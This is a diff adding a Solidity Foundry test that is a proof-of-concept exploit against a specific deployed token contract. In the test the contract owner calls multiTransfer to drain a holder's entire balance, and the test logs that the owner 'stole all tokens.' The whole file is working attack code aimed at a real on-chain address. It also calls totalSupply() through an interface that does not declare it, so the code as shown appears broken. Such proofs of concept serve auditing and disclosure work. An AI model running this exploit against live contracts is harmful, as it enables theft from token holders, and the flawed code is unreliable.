@@ -1,0 +1,76 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.12;
+
+import "forge-std/Test.sol";
+
+interface ISPOOKYHALLOWEENFLOKI {
+    function getOwner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function launchMode() external view returns (bool);
+    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external;
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function isFeeExempt(address) external view returns (bool);
+}
+
+contract ExploitTest is Test {
+    address constant TARGET = 0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f;
+    ISPOOKYHALLOWEENFLOKI public target;
+
+    address public owner;
+    address public victim;
+
+    function setUp() public {
+        target = ISPOOKYHALLOWEENFLOKI(TARGET);
+
+        // Retrieve the contract owner
+        owner = target.getOwner();
+        vm.label(owner, "Owner");
+
+        // Create a random victim address
+        victim = address(0x12345);
+        vm.label(victim, "Victim");
+
+        // Give some ETH to owner for gas
+        deal(owner, 100 ether);
+
+        // Ensure launchMode is true (should be default)
+        assertTrue(target.launchMode(), "LaunchMode should be true");
+
+        // Transfer some tokens from owner to victim to simulate a user holding tokens
+        vm.startPrank(owner);
+        uint256 transferAmount = 100_000 * 1e9; // 100,000 tokens (9 decimals)
+        require(target.transfer(victim, transferAmount), "transfer failed");
+        vm.stopPrank();
+
+        // Verify victim received tokens
+        assertEq(target.balanceOf(victim), transferAmount, "Victim should have tokens");
+        assertEq(target.balanceOf(owner), target.totalSupply() - transferAmount, "Owner should have remaining");
+    }
+
+    function testExploit_OwnerStealsVictimTokens() public {
+        // Record balances before exploit
+        uint256 victimBalanceBefore = target.balanceOf(victim);
+        uint256 ownerBalanceBefore = target.balanceOf(owner);
+
+        // Owner executes multiTransfer from victim to owner, transferring all victim's tokens
+        address[] memory addresses = new address[](1);
+        addresses[0] = owner;
+        uint256[] memory tokens = new uint256[](1);
+        tokens[0] = victimBalanceBefore;
+
+        vm.prank(owner);
+        target.multiTransfer(victim, addresses, tokens);
+
+        // Verify outcome: victim lost all tokens, owner gained them
+        uint256 victimBalanceAfter = target.balanceOf(victim);
+        uint256 ownerBalanceAfter = target.balanceOf(owner);
+
+        assertEq(victimBalanceAfter, 0, "Victim should have zero tokens");
+        assertEq(ownerBalanceAfter, ownerBalanceBefore + victimBalanceBefore, "Owner should have gained victim's tokens");
+
+        // Log success
+        emit log("Exploit successful: Owner stole all tokens from victim");
+    }
+}
+```
